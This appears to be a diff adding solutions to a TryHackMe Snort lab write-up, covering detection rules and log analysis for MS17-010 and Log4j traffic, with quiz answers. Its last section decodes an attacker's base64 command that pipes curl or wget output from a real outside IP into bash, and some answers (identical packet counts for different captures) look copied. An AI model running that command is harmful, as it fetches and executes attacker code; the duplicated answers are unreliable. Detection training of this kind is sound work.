@@ -1,7 +1,5 @@
 # [TryHackMe | Snort Challenge - The Basics](https://tryhackme.com/room/snortchallenges1) Challenge Room Solution Writeup
 
-## [Task 1 Introduction](https://tryhackme.com/room/snortchallenges1?taskNo=1)
-
 ## [Task 2 Writing IDS Rules (HTTP)](https://tryhackme.com/room/snortchallenges1?taskNo=2)
 
 ### Write a rule to detect all TCP packets from or to port 80.
@@ -367,21 +365,117 @@ sudo snort -c local-7.rules -r mx-1.pcap -l ./
 
 ## [Task 7 Using External Rules (MS17-010)](https://tryhackme.com/room/snortchallenges1?taskNo=7)
 
+### Use the given rule file (local.rules) to investigate the ms1710 exploitation.
 
+Use `snort` with the following arguments:
 ```bash
-
+sudo snort -c local.rules -r ms-17-010.pcap -l ./
 ```
+
+- What is the number of the detected packets?
+
+    **25154**
+
+### Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
+
+Use `nano` to add the following rule to `local-1.rules`:
+```bash
+alert tcp any any <> any any (msg: "\\IPC$ keyword detected"; content: "\\IPC$"; sid: 100007; rev: 1;)
+```
+
+Use `snort` with the following arguments:
+```bash
+sudo snort -c local.rules -r ms-17-010.pcap -l ./
+```
+
+- What is the number of the detected packets?
+
+    **12**
+
+### Investigate the log/alarm files.
+
+Use the `-X` argument to display the packet payload:
+```bash
+sudo snort -r snort.log.XXXXXXXXXX -X
+```
+
+- What is the requested path?
+
+    **\\192.168.116.138\IPC$**
+
+- What is the CVSS v2 score of the MS17-010 vulnerability?
+
+    Visit [NIST](https://nvd.nist.gov/vuln/detail/CVE-2017-0144) to obtain **9.3**.
 
 ## [Task 8 Using External Rules (Log4j)](https://tryhackme.com/room/snortchallenges1?taskNo=8)
 
 
-```bash
+### Use the given rule file (local.rules) to investigate the log4j exploitation.
 
+Use `snort` with the following arguments:
+```bash
+sudo snort -c local.rules -r log4j.pcap -l ./
 ```
 
-## [Task 9 Conclusion](https://tryhackme.com/room/snortchallenges1?taskNo=9)
+- What is the number of the detected packets?
 
+    **25154**
 
+### Investigate the log/alarm files.
+
+Use `grep` with the following arguments:
 ```bash
-
+grep -oP '\[\d+:\K\d+(?=:)' alert | sort -u
+21003726
+21003728
+21003730
+21003731
 ```
+
+- How many rules were triggered?.
+
+    **4**
+
+- What are the first six digits of the triggered rule sids?
+
+    **210037**
+
+### Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.
+
+Use `nano` to add the following rule to `local-1.rules`:
+```bash
+alert tcp any any -> any any (msg:"Payload size 770-855 bytes"; dsize:770<>855; sid:100008; rev:1;)
+```
+
+Use `snort` with the following arguments:
+```bash
+sudo snort -c local-1.rules -r log4j.pcap -l ./
+```
+
+- What is the number of the detected packets?
+
+    **12**
+
+### Investigate the log/alarm files.
+
+Use the `-X` argument to display the packet payload:
+```bash
+sudo snort -r snort.log.XXXXXXXXXX -X
+```
+Find the below answers in the second to last packet listed.
+
+- What is the name of the used encoding algorithm?
+
+    **Base64**
+
+- What is the IP ID of the corresponding packet?
+
+    **62808**
+
+- Decode the encoded command. What is the attacker's command?
+
+    `KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=` becomes **(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash**
+
+- What is the CVSS v2 score of the Log4j vulnerability?
+
+    Visit [NIST](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) to obtain **9.3**.
